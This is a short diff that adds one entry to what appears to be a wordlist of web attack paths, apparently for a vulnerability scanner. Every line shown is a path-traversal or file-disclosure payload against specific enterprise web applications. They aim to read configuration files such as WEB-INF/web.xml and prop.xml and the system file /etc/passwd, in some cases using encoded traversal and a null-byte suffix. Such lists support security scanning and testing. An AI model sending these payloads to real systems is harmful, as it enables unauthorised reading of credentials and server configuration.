@@ -475,3 +475,4 @@
 /NCFindWeb?service=IPreAlertConfigService&filename=../../ierp/bin/prop.xml
 /portal/file?cmd=getFileLocal&fileid=..%2F..%2F..%2F..%2Fwebapps/nc_web/WEB-INF/web.xml
 /iuap-apcom-workbench/ucf-wh/yonbiplogin/..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252F..%252Fetc%252Fpasswd%2500.png.js
+/{{path}}?javax.servlet.include.servlet_path=/WEB-INF/web.xml
